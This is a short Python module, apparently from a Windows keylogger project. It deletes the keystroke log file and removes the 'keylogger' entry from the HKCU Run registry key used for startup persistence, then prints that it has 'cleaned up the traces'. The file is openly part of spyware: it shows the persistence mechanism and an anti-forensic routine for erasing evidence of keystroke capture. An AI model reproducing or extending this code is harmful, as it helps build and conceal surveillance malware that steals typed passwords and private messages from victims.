import logging
import os
from settingUp import logPath
import winreg


# function to delete the keylog file
def delete_keylog_file():
    for handler in logging.root.handlers[:]:
        handler.close()
        logging.root.removeHandler(handler)
    if os.path.exists(logPath):
        os.remove(logPath)
        print("\nFile deleted successfully\n")

# function to clean up the things we have done 
def cleanup():
    remove_from_startup()
    delete_keylog_file()
    print("\nCleaned up the traces :)\n")

# Function to remove the path from the registry
def remove_from_startup():
    """Remove script from Windows startup"""
    try:
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0,
            winreg.KEY_SET_VALUE
        )
        
        winreg.DeleteValue(key, "keylogger")
        winreg.CloseKey(key)
        print("Successfully removed from startup!")
        return True
        
    except Exception as e:
        print(f"Failed to remove from startup: {e}")
        return False
